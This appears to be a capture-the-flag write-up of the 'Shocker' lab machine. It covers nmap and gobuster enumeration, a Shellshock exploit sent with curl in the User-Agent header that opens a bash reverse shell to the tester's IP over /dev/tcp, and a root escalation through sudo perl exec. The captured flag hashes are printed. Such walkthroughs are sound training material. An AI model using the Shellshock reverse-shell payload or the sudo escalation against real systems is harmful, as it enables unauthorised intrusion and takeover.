## Initial NMAP scan:

```bash
┌──(parallels㉿V35HR4J)-[~]
└─$ nmap 10.129.42.150 -T4                  
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-15 14:06 +0545
Nmap scan report for 10.129.42.150
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 27.29 seconds
```

## Enemurating Port 80:

gobuster gives /cgi-bin/, it's always worth checking for .sh files:

```bash                   
┌──(parallels㉿V35HR4J)-[~]
└─$ gobuster dir -u http://10.129.42.150/cgi-bin/ -x .sh -w /usr/share/wordlists/dirb/common.txt -t 30 

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.42.150/cgi-bin/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              sh
[+] Timeout:                 10s
===============================================================
2023/12/15 14:53:22 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 305]
/.htpasswd            (Status: 403) [Size: 305]
/.hta                 (Status: 403) [Size: 300]
/.htaccess.sh         (Status: 403) [Size: 308]
/.htpasswd.sh         (Status: 403) [Size: 308]
/.hta.sh              (Status: 403) [Size: 303]
/user.sh              (Status: 200) [Size: 118]
```

we can see the /user.sh file, small google leads to this [article](https://www.infosecarticles.com/exploiting-shellshock-vulnerability/) which explains the shellshock vulnerability.

```bash
┌──(parallels㉿V35HR4J)-[~]
└─$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.23/1234 0>&1' http://10.129.42.150/cgi-bin/user.sh
```

Got Our user flag:

```bash
┌──(parallels㉿V35HR4J)-[~]
└─$ nc -lnvp 1234 
listening on [any] 1234 ...
connect to [10.10.14.23] from (UNKNOWN) [10.129.42.150] 51598
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ cat `find / -name user.txt 2>/dev/null`
cat `find / -name user.txt 2>/dev/null`
448d885fa75622b2c6deb42100b9c967

```

## Privilege Escalation:

```bash
shelly@Shocker:/tmp$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
[GTFO](https://gtfobins.github.io/gtfobins/perl/) BINs FTW

```bash
shelly@Shocker:/tmp$ sudo perl -e 'exec "/bin/sh";'
cat /root/root.txt
c0998762c1cb296300d9e5e9509b8a89
```

# Takeaways:
- RECURCSIVE FUZZINGGGGGG!!!